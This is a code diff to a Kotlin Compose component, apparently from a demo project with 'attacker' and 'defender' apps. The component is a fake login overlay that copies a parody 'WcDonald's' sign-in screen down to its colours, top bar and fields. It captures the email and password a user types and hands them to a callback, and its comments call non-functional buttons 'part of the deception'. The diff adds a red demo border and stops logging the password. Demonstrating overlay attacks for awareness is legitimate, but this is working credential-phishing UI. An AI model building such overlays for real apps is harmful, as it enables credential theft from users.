@@ -2,10 +2,12 @@ package com.ghosttouch.attacker.overlay
 
 import android.util.Log
 import androidx.compose.foundation.background
+import androidx.compose.foundation.border
 import androidx.compose.foundation.layout.*
 import androidx.compose.foundation.shape.RoundedCornerShape
 import androidx.compose.foundation.text.KeyboardOptions
 import androidx.compose.material.icons.Icons
+import androidx.compose.material.icons.automirrored.filled.ArrowBack
 import androidx.compose.material.icons.filled.Email
 import androidx.compose.material.icons.filled.Lock
 import androidx.compose.material.icons.filled.Visibility
@@ -25,110 +27,103 @@ import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
 
 /**
- * Fake login overlay that mimics the WcDonald's login screen.
+ * Fake login overlay — pixel-perfect replica of the WcDonald's LoginScreen.
  *
- * ## The deception
- * This overlay is designed to look identical to the real WcDonald's login screen.
- * It matches the same:
- * - Color scheme (red/yellow)
- * - Layout and spacing
- * - Font styles and sizes
- * - Logo placement
- * - Button styling
+ * Uses the exact same Material3 components (Scaffold, TopAppBar, OutlinedTextField)
+ * with identical colors, shapes, spacing and typography as the real defender app.
  *
- * When displayed on top of the real app, the user sees what appears to be a
- * legitimate login prompt and enters their credentials, which are captured
- * by the attacker.
- *
- * @param onCredentialsCaptured Callback with email and password when "Sign In" is pressed.
- * @param onDismiss Callback when the overlay should be removed.
+ * A subtle red border is added around the edges as a demo indicator so the
+ * presenter can visually distinguish the overlay from the real app during demos.
  */
+
+// WcDonald's brand colors — must match defender/ui/theme/Theme.kt exactly
+private val WcRed = Color(0xFFDA291C)
+private val WcYellow = Color(0xFFFFC72C)
+private val WcWhite = Color(0xFFFFFFFF)
+private val WcBackground = Color(0xFFFAFAFA)
+private val WcGrayDark = Color(0xFF757575)
+
+/** Demo-only red border color to identify the overlay visually. */
+private val DemoBorderRed = Color(0xFFFF0000)
+
+@OptIn(ExperimentalMaterial3Api::class)
 @Composable
 fun FakeLoginOverlay(
     onCredentialsCaptured: (email: String, password: String) -> Unit,
     onDismiss: () -> Unit
 ) {
-    // WcDonald's brand colors (must match the real app exactly)
-    val wcRed = Color(0xFFDA291C)
-    val wcYellow = Color(0xFFFFC72C)
-    val wcWhite = Color(0xFFFFFFFF)
-    val wcBackground = Color(0xFFFAFAFA)
-    val wcGray = Color(0xFF757575)
-
     var email by remember { mutableStateOf("") }
     var password by remember { mutableStateOf("") }
     var passwordVisible by remember { mutableStateOf(false) }
     var isLoading by remember { mutableStateOf(false) }
     val coroutineScope = rememberCoroutineScope()
 
-    // Fullscreen background matching WcDonald's theme
+    // Red border wrapping the entire overlay for demo visibility
     Box(
         modifier = Modifier
             .fillMaxSize()
-            .background(wcBackground)
+            .border(3.dp, DemoBorderRed)
+            .background(WcBackground)
     ) {
-        Column(
-            modifier = Modifier.fillMaxSize()
-        ) {
-            // Fake top app bar — matches WcDonald's exactly
-            Box(
-                modifier = Modifier
-                    .fillMaxWidth()
-                    .statusBarsPadding()
-                    .height(64.dp)
-                    .background(wcRed),
-                contentAlignment = Alignment.CenterStart
-            ) {
-                Text(
-                    "Sign In",
-                    color = wcWhite,
-                    fontSize = 20.sp,
-                    fontWeight = FontWeight.Normal,
-                    modifier = Modifier.padding(start = 56.dp)
+        Scaffold(
+            containerColor = WcBackground,
+            topBar = {
+                // Exact same TopAppBar as defender LoginActivity
+                TopAppBar(
+                    title = { Text("Sign In") },
+                    navigationIcon = {
+                        IconButton(onClick = { /* fake back — does nothing */ }) {
+                            Icon(Icons.AutoMirrored.Filled.ArrowBack, contentDescription = "Back")
+                        }
+                    },
+                    colors = TopAppBarDefaults.topAppBarColors(
+                        containerColor = WcRed,
+                        titleContentColor = WcWhite,
+                        navigationIconContentColor = WcWhite
+                    )
                 )
             }
-
-            // Form content — mirrors real LoginScreen layout
+        ) { padding ->
             Column(
                 modifier = Modifier
-                    .fillMaxWidth()
+                    .fillMaxSize()
+                    .padding(padding)
                     .padding(24.dp),
                 horizontalAlignment = Alignment.CenterHorizontally,
                 verticalArrangement = Arrangement.spacedBy(16.dp)
             ) {
                 Spacer(modifier = Modifier.height(24.dp))
 
-                // Logo — identical to real app
+                // Logo — identical to defender
                 Box(
                     modifier = Modifier
                         .size(80.dp)
-                        .background(wcYellow, RoundedCornerShape(40.dp)),
+                        .background(WcYellow, RoundedCornerShape(40.dp)),
                     contentAlignment = Alignment.Center
                 ) {
                     Text(
                         "W",
                         fontSize = 40.sp,
                         fontWeight = FontWeight.Bold,
-                        color = wcRed
+                        color = WcRed
                     )
                 }
 
                 Text(
                     "Welcome Back",
-                    fontSize = 24.sp,
-                    fontWeight = FontWeight.Bold,
-                    color = Color.Black
+                    style = MaterialTheme.typography.headlineSmall,
+                    fontWeight = FontWeight.Bold
                 )
 
                 Text(
                     "Sign in to your WcDonald's account",
-                    fontSize = 14.sp,
-                    color = wcGray
+                    style = MaterialTheme.typography.bodyMedium,
+                    color = WcGrayDark
                 )
 
                 Spacer(modifier = Modifier.height(16.dp))
 
-                // Email field — captures typed email
+                // Email field — same spec as defender
                 OutlinedTextField(
                     value = email,
                     onValueChange = { email = it },
@@ -143,7 +138,7 @@ fun FakeLoginOverlay(
                     shape = RoundedCornerShape(12.dp)
                 )
 
-                // Password field — captures typed password
+                // Password field — same spec as defender
                 OutlinedTextField(
                     value = password,
                     onValueChange = { password = it },
@@ -170,17 +165,14 @@ fun FakeLoginOverlay(
 
                 Spacer(modifier = Modifier.height(8.dp))
 
-                // Fake sign-in button — triggers credential capture
+                // Sign in button — same spec as defender
                 Button(
                     onClick = {
                         isLoading = true
-                        // Read state values immediately before any lifecycle changes
                         val capturedEmail = email
                         val capturedPassword = password
-                        Log.d("FakeLoginOverlay", "Capturing: email=$capturedEmail, password=$capturedPassword")
-                        // Capture the entered credentials
+                        Log.d("FakeLoginOverlay", "Capturing: email=$capturedEmail")
                         onCredentialsCaptured(capturedEmail, capturedPassword)
-                        // Delay dismiss to let capture complete and show loading animation
                         coroutineScope.launch {
                             delay(500)
                             onDismiss()
@@ -190,25 +182,21 @@ fun FakeLoginOverlay(
                         .fillMaxWidth()
                         .height(52.dp),
                     shape = RoundedCornerShape(12.dp),
-                    colors = ButtonDefaults.buttonColors(containerColor = wcRed),
+                    colors = ButtonDefaults.buttonColors(containerColor = WcRed),
                     enabled = email.isNotBlank() && password.isNotBlank() && !isLoading
                 ) {
                     if (isLoading) {
                         CircularProgressIndicator(
                             modifier = Modifier.size(24.dp),
-                            color = wcWhite
+                            color = WcWhite
                         )
                     } else {
-                        Text(
-                            "Sign In",
-                            fontSize = 16.sp,
-                            fontWeight = FontWeight.SemiBold
-                        )
+                        Text("Sign In", fontSize = 16.sp, fontWeight = FontWeight.SemiBold)
                     }
                 }
 
-                TextButton(onClick = { /* Non-functional — part of the deception */ }) {
-                    Text("Forgot Password?", color = wcRed)
+                TextButton(onClick = { /* fake — part of the deception */ }) {
+                    Text("Forgot Password?", color = WcRed)
                 }
             }
         }
